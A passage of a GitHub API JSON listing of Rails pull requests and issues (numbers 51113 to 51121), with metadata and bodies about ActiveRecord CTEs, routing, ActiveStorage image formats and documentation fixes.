the LoC, and its `require` is 90 milliseconds. Something in-between might be nice.\r\n\r\nI made a [google spreadsheet](https://docs.google.com/spreadsheets/d/13hz5ndUBDeTqAKwYCv5CyAMGpcCVkc5hwJ7Is7BG0qo/edit#gid=0) listing browser versions that support each of the `:modern` features listed. The tl;dr is that badges and css nesting are the most-restrictive requirement for every major browser except Firefox (which was late to support css :has).",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51121/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51121/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51120",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51120/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51120/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51120/events",
        "html_url": "https://github.com/rails/rails/pull/51120",
        "id": 2141082579,
        "node_id": "PR_kwDNIULOZzhnSw",
        "number": 51120,
        "title": "Add links to config.active_job.default_queue_name",
        "user": {
            "login": "skipkayhil",
            "id": 6014046,
            "node_id": "MDQ6VXNlcjYwMTQwNDY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/6014046?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/skipkayhil",
            "html_url": "https://github.com/skipkayhil",
            "followers_url": "https://api.github.com/users/skipkayhil/followers",
            "following_url": "https://api.github.com/users/skipkayhil/following{/other_user}",
            "gists_url": "https://api.github.com/users/skipkayhil/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/skipkayhil/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/skipkayhil/subscriptions",
            "organizations_url": "https://api.github.com/users/skipkayhil/orgs",
            "repos_url": "https://api.github.com/users/skipkayhil/repos",
            "events_url": "https://api.github.com/users/skipkayhil/events{/privacy}",
            "received_events_url": "https://api.github.com/users/skipkayhil/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-18T16:46:24Z",
        "updated_at": "2024-02-18T16:58:36Z",
        "closed_at": "2024-02-18T16:58:32Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51120",
            "html_url": "https://github.com/rails/rails/pull/51120",
            "diff_url": "https://github.com/rails/rails/pull/51120.diff",
            "patch_url": "https://github.com/rails/rails/pull/51120.patch",
            "merged_at": "2024-02-18T16:58:32Z"
        },
        "body": "[ci-skip]\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51120/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51120/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51119",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51119/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51119/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51119/events",
        "html_url": "https://github.com/rails/rails/pull/51119",
        "id": 2140981169,
        "node_id": "PR_kwDNIULOZzckfg",
        "number": 51119,
        "title": "Allow raw CTEs in with query method",
        "user": {
            "login": "richardTowers",
            "id": 1696784,
            "node_id": "MDQ6VXNlcjE2OTY3ODQ=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1696784?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/richardTowers",
            "html_url": "https://github.com/richardTowers",
            "followers_url": "https://api.github.com/users/richardTowers/followers",
            "following_url": "https://api.github.com/users/richardTowers/following{/other_user}",
            "gists_url": "https://api.github.com/users/richardTowers/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/richardTowers/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/richardTowers/subscriptions",
            "organizations_url": "https://api.github.com/users/richardTowers/orgs",
            "repos_url": "https://api.github.com/users/richardTowers/repos",
            "events_url": "https://api.github.com/users/richardTowers/events{/privacy}",
            "received_events_url": "https://api.github.com/users/richardTowers/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-18T13:06:44Z",
        "updated_at": "2024-02-18T13:30:34Z",
        "closed_at": "2024-02-18T13:30:34Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51119",
            "html_url": "https://github.com/rails/rails/pull/51119",
            "diff_url": "https://github.com/rails/rails/pull/51119.diff",
            "patch_url": "https://github.com/rails/rails/pull/51119.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because I've found the `.with()` method to be a little overly restrictive - in particular, I would like to be able to name the columns of the CTE, which would allow me to use expressions without column names (e.g. `VALUES`).\r\n\r\n### Detail\r\n\r\nSupport for the `.with` query method was added in https://github.com/rails/rails/pull/37944\r\n\r\nThe hash based syntax added in that PR supports Relations, Arel SelectManagers, and SqlLiterals as expressions, but only allows simple names for the CTEs.\r\n\r\nIn some circumstances, it's useful to be able to name the columns of the CTE as well as the table.\r\n\r\nFor example, if the expression is a ValuesList:\r\n\r\n    WITH magic(a, b, c) AS (VALUES (2, 6, 7), (9, 5, 1), (4, 3, 8))\r\n    SELECT a + b + c FROM magic;\r\n\r\n... we need to be able to name the columns in order to reference them later.\r\n\r\nOne use case for having this supported in ActiveRecord's with query method is joining the results from a previous query to a subsequent one. For example, if you were walking through an org chart, but you couldn't use recursive CTEs, you could use this approach to keep information about the management path:\r\n\r\n    big_bosses = Employee.where(manager: nil).pluck(id)\r\n\r\n    first_level = Employee.with(Arel::Nodes::Cte.new(\r\n        Arel.sql(\"bosses(id)\"),\r\n        Arel::Nodes::Grouping.new(Arel::Nodes::ValuesList.new(big_bosses))\r\n      )\r\n      .joins(\"INNER JOIN employees ON emplooyees.manager = bosses.id\")\r\n      .pluck(\"employees.id\", \"bosses.id\")\r\n\r\n    second_level = Employee.with(Arel::Nodes::Cte.new(\r\n        Arel.sql(\"bosses(id, grand_boss_id)\"),\r\n        Arel::Nodes::Grouping.new(Arel::Nodes::ValuesList.new(first_level))\r\n      )\r\n      .joins(\"INNER JOIN employees ON emplooyees.manager = bosses.id\")\r\n      .pluck(\"employees.id\", \"bosses.id\", \"bosses.grand_boss_id\")\r\n\r\n    ... and so on ... (not tested)\r\n\r\nI'm not sure about this use case particularly, but I imagine there are a few other situations where it's useful to have more control over the name of the CTE than we currently have.\r\n\r\n### Additional information\r\n\r\n- https://github.com/rails/rails/pull/37944 (original PR to add the `.with()` query method)\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51119/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51119/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51118",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51118/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51118/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51118/events",
        "html_url": "https://github.com/rails/rails/pull/51118",
        "id": 2140650887,
        "node_id": "PR_kwDNIULOZzLSIw",
        "number": 51118,
        "title": "Pass `connection_pool` to more database-related exceptions raisings",
        "user": {
            "login": "fatkodima",
            "id": 5657035,
            "node_id": "MDQ6VXNlcjU2NTcwMzU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5657035?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/fatkodima",
            "html_url": "https://github.com/fatkodima",
            "followers_url": "https://api.github.com/users/fatkodima/followers",
            "following_url": "https://api.github.com/users/fatkodima/following{/other_user}",
            "gists_url": "https://api.github.com/users/fatkodima/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/fatkodima/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/fatkodima/subscriptions",
            "organizations_url": "https://api.github.com/users/fatkodima/orgs",
            "repos_url": "https://api.github.com/users/fatkodima/repos",
            "events_url": "https://api.github.com/users/fatkodima/events{/privacy}",
            "received_events_url": "https://api.github.com/users/fatkodima/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-17T23:06:50Z",
        "updated_at": "2024-02-20T22:52:14Z",
        "closed_at": "2024-02-20T21:02:49Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51118",
            "html_url": "https://github.com/rails/rails/pull/51118",
            "diff_url": "https://github.com/rails/rails/pull/51118.diff",
            "patch_url": "https://github.com/rails/rails/pull/51118.patch",
            "merged_at": "2024-02-20T21:02:49Z"
        },
        "body": "Follow up to https://github.com/rails/rails/pull/48295.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51118/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51118/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51117",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51117/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51117/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51117/events",
        "html_url": "https://github.com/rails/rails/issues/51117",
        "id": 2140346519,
        "node_id": "I_kwDNIULOf5MYlw",
        "number": 51117,
        "title": "ActionDispatch `recognize_path` trips over domain constraints",
        "user": {
            "login": "svoop",
            "id": 7255,
            "node_id": "MDQ6VXNlcjcyNTU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/7255?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/svoop",
            "html_url": "https://github.com/svoop",
            "followers_url": "https://api.github.com/users/svoop/followers",
            "following_url": "https://api.github.com/users/svoop/following{/other_user}",
            "gists_url": "https://api.github.com/users/svoop/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/svoop/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/svoop/subscriptions",
            "organizations_url": "https://api.github.com/users/svoop/orgs",
            "repos_url": "https://api.github.com/users/svoop/repos",
            "events_url": "https://api.github.com/users/svoop/events{/privacy}",
            "received_events_url": "https://api.github.com/users/svoop/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-17T17:29:13Z",
        "updated_at": "2024-02-19T04:27:48Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\nThe following line of code may (under rare conditions) cause problems:\r\n\r\nhttps://github.com/rails/rails/blob/44db6bbfcbe66ac5926f01f3b693a378552b752f/actionpack/lib/action_dispatch/routing/route_set.rb#L888\r\n\r\nThis mock request works fine for most Rails apps, however, if the app handles multiple domains and contains domain specific constraints, things go kaboom. Say you have a constraint like this one:\r\n\r\n```ruby\r\nget '(*path)', to: \"domains#redirect\", constraints: ->(request) do\r\n  request.host != 'myservice.com'\r\nend\r\n```\r\n\r\n(Things such a `DomainsController` might do: Redirect \"www.myservice.com\" to \"myservice.com\" or redirect shortcuts such as \"yourproject.myservice.com\" to \"myservice.com/yourproject\".)\r\n\r\nWith such an entry in `routes.rb`, the mock request misbehaves because it is only fed with the `path` and therefore uses the [hardcoded fallback server name](https://github.com/rack/rack/blob/ae7d6a171963a70918b4e43525408c571a3f28fe/lib/rack/mock_request.rb#L105) \"example.org\". And since `\"example.org\" != \"myservice.com\"`, the remainder of `recognize_path` works off the wrong route.\r\n\r\nThe solution is quite simple, something along the lines of:\r\n\r\n```ruby\r\n# replace...\r\nenv = Rack::MockRequest.env_for(path, method: method)\r\n\r\n# with...\r\nenv = Rack::MockRequest.env_for(url_helpers.root_url.delete(r{/$}) + path, method: method)\r\n```\r\n\r\nBy passing the real URL instead of just the path, the mock request no longer uses the fallback but hits the router as a real request would.\r\n\r\nI'll work around this for now and take a look at the corresponding tests to check whether I can solder together a PR.\r\n\r\n### System configuration\r\n**Rails version**: 6.1.7.6 (but the code hasn't changed on `main` as of today)\r\n\r\n**Ruby version**: 3.1.4\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51117/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 1
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51117/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51116",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51116/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51116/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51116/events",
        "html_url": "https://github.com/rails/rails/pull/51116",
        "id": 2140218997,
        "node_id": "PR_kwDNIULOZyyhfA",
        "number": 51116,
        "title": "Handle empty array value in query builder's tuple syntax",
        "user": {
            "login": "Slotos",
            "id": 314453,
            "node_id": "MDQ6VXNlcjMxNDQ1Mw==",
            "avatar_url": "https://avatars.githubusercontent.com/u/314453?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Slotos",
            "html_url": "https://github.com/Slotos",
            "followers_url": "https://api.github.com/users/Slotos/followers",
            "following_url": "https://api.github.com/users/Slotos/following{/other_user}",
            "gists_url": "https://api.github.com/users/Slotos/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Slotos/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Slotos/subscriptions",
            "organizations_url": "https://api.github.com/users/Slotos/orgs",
            "repos_url": "https://api.github.com/users/Slotos/repos",
            "events_url": "https://api.github.com/users/Slotos/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Slotos/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-02-17T15:58:38Z",
        "updated_at": "2024-02-27T18:19:02Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51116",
            "html_url": "https://github.com/rails/rails/pull/51116",
            "diff_url": "https://github.com/rails/rails/pull/51116.diff",
            "patch_url": "https://github.com/rails/rails/pull/51116.patch",
            "merged_at": null
        },
        "body": "Specifically, `.where([:id] => [])` is now equivalent to `where(:id => [])`.\r\n\r\n### Motivation / Background\r\n\r\nThis behaviour fixes `#collection_singular_ids=` for relations with composite query constraints when used in forms, as `ids_writer` compacts blank values before looking up matching records, efectively calling `.where(primary_key => [])` when, for example, all checkboxes were deselected by a user on a form.\r\n\r\nThe error indicative of the behaviour that this commit attempts to fix: `Arel::Visitors::UnsupportedVisitError: Unsupported argument type: NilClass. Construct an Arel node instead.`\r\n\r\n### Detail\r\n\r\n`#reduce` returns `nil` when operating on empty collections. This commit adds a separate branch for handling an empty query set in `PredicateBuilder#grouping_queries`.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51116/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51116/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51115",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51115/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51115/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51115/events",
        "html_url": "https://github.com/rails/rails/pull/51115",
        "id": 2139925795,
        "node_id": "PR_kwDNIULOZyh_ZA",
        "number": 51115,
        "title": "Change Default Variant Format from PNG to WEBP",
        "user": {
            "login": "6temes",
            "id": 5655861,
            "node_id": "MDQ6VXNlcjU2NTU4NjE=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5655861?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/6temes",
            "html_url": "https://github.com/6temes",
            "followers_url": "https://api.github.com/users/6temes/followers",
            "following_url": "https://api.github.com/users/6temes/following{/other_user}",
            "gists_url": "https://api.github.com/users/6temes/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/6temes/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/6temes/subscriptions",
            "organizations_url": "https://api.github.com/users/6temes/orgs",
            "repos_url": "https://api.github.com/users/6temes/repos",
            "events_url": "https://api.github.com/users/6temes/events{/privacy}",
            "received_events_url": "https://api.github.com/users/6temes/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-17T10:02:14Z",
        "updated_at": "2024-02-17T11:42:12Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51115",
            "html_url": "https://github.com/rails/rails/pull/51115",
            "diff_url": "https://github.com/rails/rails/pull/51115.diff",
            "patch_url": "https://github.com/rails/rails/pull/51115.patch",
            "merged_at": null
        },
        "body": "# Use WEBP as the default format for representations\r\n\r\nThis pull request updates the `default_variant_format` method in the `representable.rb` file. Previously, the default image format was PNG. With this change, the default image format is now WEBP.\r\n\r\nThis change is made to improve the performance of our web pages, as [all major browsers support WEBP images](https://caniuse.com/webp), which are generally smaller in size compared to PNG images, without any significant loss in image quality. This will help in faster loading of images and improve the overall user experience.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51115/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51115/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51114",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51114/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51114/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51114/events",
        "html_url": "https://github.com/rails/rails/pull/51114",
        "id": 2139911803,
        "node_id": "PR_kwDNIULOZyhSmQ",
        "number": 51114,
        "title": "[Fix #33155] Set through target for new records",
        "user": {
            "login": "joshuay03",
            "id": 54629302,
            "node_id": "MDQ6VXNlcjU0NjI5MzAy",
            "avatar_url": "https://avatars.githubusercontent.com/u/54629302?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/joshuay03",
            "html_url": "https://github.com/joshuay03",
            "followers_url": "https://api.github.com/users/joshuay03/followers",
            "following_url": "https://api.github.com/users/joshuay03/following{/other_user}",
            "gists_url": "https://api.github.com/users/joshuay03/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/joshuay03/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/joshuay03/subscriptions",
            "organizations_url": "https://api.github.com/users/joshuay03/orgs",
            "repos_url": "https://api.github.com/users/joshuay03/repos",
            "events_url": "https://api.github.com/users/joshuay03/events{/privacy}",
            "received_events_url": "https://api.github.com/users/joshuay03/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-17T09:15:40Z",
        "updated_at": "2024-02-17T12:05:15Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51114",
            "html_url": "https://github.com/rails/rails/pull/51114",
            "diff_url": "https://github.com/rails/rails/pull/51114.diff",
            "patch_url": "https://github.com/rails/rails/pull/51114.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nFixes #33155\r\n\r\n### Detail\r\n\r\nUpdates `#load_target` in `ActiveRecord::Associations::CollectionAssociation` and `ActiveRecord::Associations::Association` (which is inherited by `ActiveRecord::Associations::SingularAssociation`) to set the through association target using the middle record when the current record has not yet been persisted.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\nI usually include coverage before opening a PR but I'd like some initial feedback on this before I do that given that it's a change to a core part of AR and I'm not certain that a patch will be accepted for this issue. However, I've got [a reproduction script](https://github.com/rails/rails/issues/33155#issuecomment-1949912960) which passes against this branch.\r\n\r\nThere also seems to have been [another attempted patch](https://github.com/rails/rails/pull/38562) which didn't end up getting merged.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51114/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51114/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51113",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51113/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51113/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51113/events",
        "html_url": "https://github.com/rails/rails/pull/51113",
        "id": 2139784362,
        "node_id": "PR_kwDNIULOZyam8Q",
        "number": 51113,
        "title": "Document missing active storage queue configs",
        "user": {
            "login": "ghiculescu",
            "id": 509837,
            "node_id": "MDQ6VXNlcjUwOTgzNw==",
            "avatar_url": "https://avatars.githubusercontent.com/u/509837?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ghiculescu",
            "html_url": "https://github.com/ghiculescu",
            "followers_url": "https://api.github.com/users/ghiculescu/followers",
            "following_url": "https://api.github.com/users/ghiculescu/following{/other_user}",
            "gists_url": "https://api.github.com/users/ghiculescu/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ghiculescu/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ghiculescu/subscriptions",
            "organizations_url": "https://api.github.com/users/ghiculescu/orgs",
            "repos_url": "https://api.github.com/users/ghiculescu/repos",
            "events_url": "https://api.github.com/users/ghiculescu/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ghiculescu/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-17T03:12:30Z",
        "updated_at": "2024-02-18T21:42:17Z",
        "closed_at": "2024-02-18T16:34:14Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51113",
            "html_url": "https://github.com/rails/rails/pull/51113",
            "diff_url": "https://github.com/rails/rails/pull/51113.diff",
            "patch_url": "https://github.com/rails/rails/pull/51113.patch",
            "merged_at": "2024-02-18T16:34:14Z"
        },
        "body": "ref https://github.com/rails/rails/pull/51030#discussion_r1491915873\r\n\r\n- Document `preview_image` and `transform`\r\n- List the queue configs in alphabetical order",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51113/reactions",
            "total_count": 1,
